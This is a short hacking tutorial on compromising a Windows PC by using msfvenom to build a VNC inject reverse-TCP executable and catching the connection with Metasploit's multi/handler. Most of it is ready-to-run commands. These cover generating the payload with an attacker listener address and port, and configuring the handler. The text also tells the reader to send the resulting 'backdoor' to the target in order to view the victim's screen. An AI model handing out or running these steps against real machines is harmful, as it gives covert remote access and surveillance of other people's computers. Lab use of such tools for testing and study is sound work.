Capture VNC Session of Remote PC using Msfvenom

Today in this article we’ll try to compromise the target using VNCpayload. In this tutorial you’ll learn how to create a VNC payload using msfvenom and try to achieve VNC shell of victim’s PC.
Open the terminal in your Kali Linux and type following command to generate a VNC payload using msfvenom command.
Msfvenom –p windows/vncinject/reverse_tcp lhost=192.168.1.15 lport=4444 –f exe > /root/Desktop/vnc.exe
 Now the above command will generate an exe file for the VNC payload on the desktop of Kali Linux. Being an attack you need to send this backdoor to the target and start multi handler in the metasploit framework

msfconsole
use multi/handler
msf exploit(handler) > set payload windows/vncinject/reverse_tcp
msf exploit(handler) > set lhost 192.168.1.15
msf exploit(handler) > set lport 4444
msf exploit(handler) > exploit

Now attacker tries to connect with target using VNC payload, from given screenshot you can see it has launched vncviewer and we have our session 1 is running at background.
